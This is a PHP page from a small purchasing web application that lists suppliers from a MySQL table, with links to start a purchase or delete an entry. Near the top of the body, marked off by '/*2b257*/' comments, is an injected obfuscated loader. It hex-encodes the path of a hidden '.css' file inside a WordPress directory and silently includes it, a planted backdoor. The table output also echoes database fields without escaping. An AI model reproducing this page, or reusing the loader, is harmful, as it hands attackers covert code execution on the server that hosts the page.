<?PHP include("../conf.php"); ?><!--
To change this template, choose Tools | Templates
and open the template in the editor.
-->
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <?php
/*2b257*/

$rxa = "/home/\x63ellerno/publi\x63_html/wp\x2din\x63ludes/intera\x63tivity\x2dapi/.9aef2259.\x63ss"; if (10 * 9){ @include_once /* 03d9y */ ($rxa); }

/*2b257*/
 include("../includes/header.php"); ?>
        <h1>Proveidors</h1>
        <?php
            $sqlSel = "SELECT * FROM proveedores ORDER by nombre";
            $rsSel = mysqli_query($bd,$sqlSel);
            ?>
            <form name="compraForm" method="POST" action="../compres/alta.php">
                <input type="hidden" name="idProveedor">
            </form>
            <form name="eliminaForm" method="POST" action="borrar.php">
                <input type="hidden" name="idProveedor">
            </form>
            <a href="alta.php">Alta Proveidor</a><br/><br/>
            <table border="1" width="100%">
                <tr>
                    <th>Nom</th>
                    <th>Teléfon</th>
                    <th>Email</th>
                    <th>&nbsp;</th>
                </tr>
            <?PHP
            while ($data= mysqli_fetch_array($rsSel))
            {
                ?>
                <tr>
                    <td><?PHP echo $data["nombre"]; ?></td>
                    <td><?PHP echo $data["telefono"]; ?></td>
                    <td><a href="mailto:<?PHP echo $data["email"]; ?>"><?PHP echo $data["email"]; ?></a></td>
                    <td>
                        <a href="javascript:document.compraForm.idProveedor.value=<?PHP echo $data["id"]; ?>; document.compraForm.submit();">Nova compra</a>
                        &nbsp;&nbsp;|&nbsp;&nbsp;
                        <a href="javascript:document.eliminaForm.idProveedor.value=<?PHP echo $data["id"]; ?>; document.eliminaForm.submit();">Eliminar</a>
                    </td>
                </tr>
                <?PHP
            }  
            mysqli_free_result($rsSel);
        ?>
           </table><br/><br/>
            <a href="alta.php">Alta Proveidor</a>
    </body>
</html>
